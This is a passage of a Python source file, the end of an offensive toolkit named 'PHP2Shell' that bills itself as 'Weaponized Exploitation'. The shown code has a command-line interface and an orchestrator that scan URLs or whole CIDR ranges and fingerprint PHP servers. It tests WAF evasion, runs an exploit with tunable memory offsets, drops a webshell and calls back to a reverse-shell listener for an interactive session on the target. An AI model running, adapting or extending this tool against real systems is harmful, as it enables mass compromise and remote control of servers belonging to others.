                                print("[*] Reverse shell session remaining active.")
                                continue
                        except (KeyboardInterrupt, EOFError):
                            continue

                stop_event.set()
                client_sock.close()
                print(f"\n{Fore.YELLOW}[!] Remote connection terminated.{Style.RESET_ALL}")

            except socket.timeout:
                print(f"{Fore.YELLOW}[!] Listener timed out waiting for connection.{Style.RESET_ALL}")
            except Exception as e:
                print(f"{Fore.RED}[!] Listener error: {e}{Style.RESET_ALL}")

            # Ask user consent before completely exiting
            try:
                again = input(f"{Fore.YELLOW}[?] Re-listen / re-spawn reverse shell or exit? (y/N): {Style.RESET_ALL}").strip().lower()
                if again == "y":
                    if shell_url and param:
                        rev_cmd = generate_reverse_shell_cmd(lhost, lport)
                        threading.Thread(target=self.execute_webshell_cmd, args=(shell_url, param, rev_cmd), daemon=True).start()
                    continue
                else:
                    print("[*] Reverse shell listener closed by user consent.")
                    break
            except (KeyboardInterrupt, EOFError):
                break

        server_sock.close()

# ---------------------------------------------------------------------------
# REPORT GENERATION & TABLE DISPLAY
# ---------------------------------------------------------------------------

def write_reports(results: List[dict], out_base: str) -> None:
    json_path = f"{out_base}.json"
    md_path = f"{out_base}.md"

    # Write JSON
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(results, f, indent=2, default=str)

    # Write Markdown
    lines = [
        f"# PHP2Shell Unified Scan & Exploit Report",
        f"Generated: {datetime.now(timezone.utc).isoformat()} | Toolkit: v{__version__}\n",
        "## Summary Findings\n",
        "| Target | PHP Version | SAPI | Status | Active Probe | Exploit |",
        "|---|---|---|---|---|---|",
    ]
    for r in results:
        vr = r["version_result"]
        ha = r["header_analysis"]
        pr = r.get("probe_result")
        er = r.get("exploit_result")
        version = vr.get("version_string") or "Unknown"
        sapi = ha.get("runtime_mode", "unknown")
        status = vr.get("status", "unknown")
        probe_outcome = pr.get("outcome", "N/A") if pr else "N/A"
        exploit_status = er.get("status", "N/A") if er else "N/A"
        lines.append(
            f"| {r['target']} | {version} | {sapi} | "
            f"{status} | {probe_outcome} | {exploit_status} |"
        )

    with open(md_path, "w", encoding="utf-8") as f:
        f.write("\n".join(lines))
    print(f"\n{Fore.GREEN}[+] Reports saved: {json_path} & {md_path}{Style.RESET_ALL}")

# ---------------------------------------------------------------------------
# CLI ARGUMENT PARSER & MAIN ORCHESTRATOR
# ---------------------------------------------------------------------------

def build_cli() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog="php2shell",
        description="PHP2Shell Toolkit — Full-Pipeline Recon, Audit, and Weaponized Exploitation.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("targets", nargs="*", help="Target URL(s) or CIDR range(s)")
    p.add_argument("-f", "--file", help="File with targets (one per line)")
    p.add_argument("-o", "--output", help="Base filename for .json and .md report")
    p.add_argument("-t", "--threads", type=int, default=10, help="Deprecated compatibility flag; scan currently runs sequentially")
    p.add_argument("--timeout", type=int, default=10, help="HTTP request timeout in seconds (default: 10)")
    p.add_argument("-v", "--verbose", action="store_true", help="Verbose step output")
    p.add_argument("--json", action="store_true", help="Output JSON only")

    # Pipeline triggers
    p.add_argument("--all", "--full", action="store_true", dest="run_all",
                   help="Run the complete end-to-end pipeline (Recon -> Passive -> Probes -> WAF -> Exploit)")
    p.add_argument("--recon", action="store_true", help="Run Stage 1: Reconnaissance")
    p.add_argument("-w", "--wordlist", help="Custom wordlist file with endpoint paths (one per line)")
    p.add_argument("--remote-wordlist", "--fetch-wordlist", action="store_true", dest="fetch_wordlist",
                   help="Fetch and merge the latest GitHub SecLists Common-PHP-Filenames wordlist")
    p.add_argument("--max-endpoints", type=int, default=150, help="Maximum endpoints to probe in recon (default: 150)")
    p.add_argument("--subdomain-enum", action="store_true", help="Enumerate subdomains via crt.sh CT logs")
    p.add_argument("--active", action="store_true", help="Run Stage 3: Active Behavioral Probing")
    p.add_argument("--waf", action="store_true", help="Run Stage 4: WAF Evasion Testing")
    p.add_argument("--exploit", "--auto-shell", action="store_true", dest="exploit",
                   help="Run Stage 5: Weaponized Exploitation")
    p.add_argument("--shell", action="store_true", help="Drop into live interactive shell console upon success")

    # Exploit parameters
    p.add_argument("--cmd", default="id; whoami; uname -a", help="Initial post-exploit command")
    p.add_argument("--webshell-name", default=DEFAULT_WEBSHELL_NAME, help="Name of webshell to drop")
    p.add_argument("--exploit-method", choices=("auto", "binary", "upload", "52704", "exploitdb"), default="auto",
                   help="Exploit mechanism: 'auto', 'binary' (52704 memory leak), or 'upload'")
    p.add_argument("--exploit-profile", choices=("bookworm", "lab"), default="bookworm",
                   help="Target build profile (bookworm or lab)")
    p.add_argument("--zif-offset", type=lambda x: int(x, 0), help="Custom zif_system offset")
    p.add_argument("--dtor-offset", type=lambda x: int(x, 0), help="Custom ZVAL_PTR_DTOR offset")
    p.add_argument("--htdata-offset", type=lambda x: int(x, 0), help="Custom fake HashTable offset")
    p.add_argument("--proof-file", help="Local file to verify RCE proof")
    p.add_argument("--fetch", dest="fetch_path", help="Remote path to GET to verify RCE proof")
    p.add_argument("--huge-mb", type=int, default=12, help="Memory allocation in MB to trigger OOM")
    p.add_argument("--lhost", help="Local IP for reverse shell")
    p.add_argument("--lport", type=int, default=4444, help="Local port for reverse shell")
    p.add_argument("--carrier-trigger", default=None,
                   help="Custom short trigger command for staged exploit payload (default: 'sh /tmp/php*')")
    p.add_argument("--reverse", action="store_true", help="Spawn reverse shell callback")
    return p

def main() -> int:
    parser = build_cli()
    args = parser.parse_args()

    if args.json and (args.output or args.shell or args.reverse or args.lhost):
        parser.error("--json cannot be combined with report-file or interactive shell options")

    # Target resolution
    targets: List[str] = []
    for raw in (args.targets or []):
        try:
            net = ipaddress.ip_network(raw, strict=False)
            if net.num_addresses > 1:
                targets.extend(f"http://{h}/" for h in net.hosts())
            else:
                targets.append(f"http://{net.network_address}/")
        except ValueError:
            targets.append(raw if raw.startswith(("http://", "https://")) else f"http://{raw}")

    if args.file and os.path.isfile(args.file):
        with open(args.file, "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    targets.append(line if line.startswith(("http://", "https://")) else f"http://{line}")

    if not targets:
        if not args.json:
            print(BANNER)
        parser.print_help()
        return 1

    if not args.json:
        print(BANNER)

    do_recon = args.run_all or args.recon or bool(args.wordlist) or args.fetch_wordlist
    do_active = args.run_all or args.active
    do_waf = args.run_all or args.waf
    do_exploit = args.run_all or args.exploit or args.shell or bool(args.lhost) or args.reverse
    do_shell = args.shell

    # Prompt user for LHOST / LPORT if reverse shell is requested but LHOST was not supplied
    if args.reverse or bool(args.lhost):
        if not args.lhost:
            auto_ip = get_local_ip()
            if sys.stdin.isatty() and not args.json:
                print(f"{Fore.YELLOW}[!] Reverse shell requested, but --lhost was not specified.{Style.RESET_ALL}")
                try:
                    user_ip = input(f"{Fore.CYAN}[?] Enter LHOST IP for reverse callback [{auto_ip}]: {Style.RESET_ALL}").strip()
                    args.lhost = user_ip or auto_ip
                    user_port = input(f"{Fore.CYAN}[?] Enter LPORT [{args.lport}]: {Style.RESET_ALL}").strip()
                    if user_port.isdigit():
                        args.lport = int(user_port)
                except (KeyboardInterrupt, EOFError):
                    args.lhost = auto_ip
            else:
                args.lhost = auto_ip
            if not args.json:
                print(f"{Fore.GREEN}[+] Configured reverse shell target -> {args.lhost}:{args.lport}{Style.RESET_ALL}")

    # Load and merge endpoint wordlist (built-in + optional remote SecLists + user file)
    active_wordlist = load_custom_wordlist(
        file_path=args.wordlist,
        fetch_remote=args.fetch_wordlist,
        timeout=args.timeout,
    )

    pipe = UnifiedPHP2Shell(timeout=args.timeout, verbose=args.verbose)
    all_results: List[dict] = []

    if not args.json:
        print(f"{Fore.CYAN}[*] Starting Unified PHP2Shell run across {len(targets)} target(s)...{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[*] Active wordlist: {len(active_wordlist)} endpoint paths loaded.{Style.RESET_ALL}\n")

    for target in targets:
        if not args.json:
            print(f"{Fore.WHITE}======================================================================{Style.RESET_ALL}")
            print(f"{Fore.CYAN}TARGET: {target}{Style.RESET_ALL}")
            print(f"{Fore.WHITE}======================================================================{Style.RESET_ALL}")

        t_res: dict = {"target": target}
        ep_to_use = target
        discovered_eps: List[str] = []

        # Step 1: Recon
        if do_recon:
            r_res = pipe.run_recon(
                target,
                subdomain_enum=args.subdomain_enum,
                custom_endpoints=active_wordlist,
                max_endpoints=args.max_endpoints,
            )
            t_res["recon_result"] = asdict(r_res)
            discovered_eps = [ep.url for ep in r_res.php_endpoints]
            if r_res.best_probe_endpoint:
                ep_to_use = r_res.best_probe_endpoint

        # Step 2: Passive Fingerprinting (Single HTTP GET + Endpoint Fallback)
        vr, ha = pipe.run_passive(target, endpoint=ep_to_use)
        t_res["version_result"] = asdict(vr)
        t_res["header_analysis"] = asdict(ha)

        # Step 3: Active Behavioral Probes
        if do_active:
            pr = pipe.run_active_probes(target, endpoint=ep_to_use, alternative_endpoints=discovered_eps)
            t_res["probe_result"] = asdict(pr)

        # Step 4: WAF Analysis
        if do_waf:
            wa = pipe.run_waf_analysis(target, endpoint=ep_to_use)
            t_res["waf_analysis"] = asdict(wa)

        # Step 5: Weaponized Exploitation
        if do_exploit:
            er = pipe.run_exploit(
                target=target,
                endpoint=ep_to_use,
                alternative_endpoints=discovered_eps,
                method=args.exploit_method,
                profile=args.exploit_profile,
                cmd=args.cmd,
                carrier_trigger=args.carrier_trigger,
                webshell_name=args.webshell_name,
                spawn_reverse=args.reverse or bool(args.lhost),
                lhost=args.lhost,
                lport=args.lport,
                zif_offset=args.zif_offset,
                dtor_offset=args.dtor_offset,
                htdata_offset=args.htdata_offset,
                proof_file=args.proof_file,
                fetch_path=args.fetch_path,
                huge_mb=args.huge_mb,
            )
            t_res["exploit_result"] = asdict(er)

            # Interactive Shell / Reverse Listener Trigger
            if args.reverse or args.lhost:
                lhost_ip = args.lhost or "127.0.0.1"
                pipe.launch_reverse_listener(lhost_ip, args.lport, er.webshell_url, er.webshell_param)
            elif do_shell and er.webshell_url:
                pipe.launch_interactive_shell(er.webshell_url, er.webshell_param)

        all_results.append(t_res)
        if not args.json:
            print()

    # Output Reports
    if args.output:
        write_reports(all_results, args.output)
    elif args.json:
        print(json.dumps(all_results, indent=2, default=str))

    return 0

if __name__ == "__main__":
    sys.exit(main())
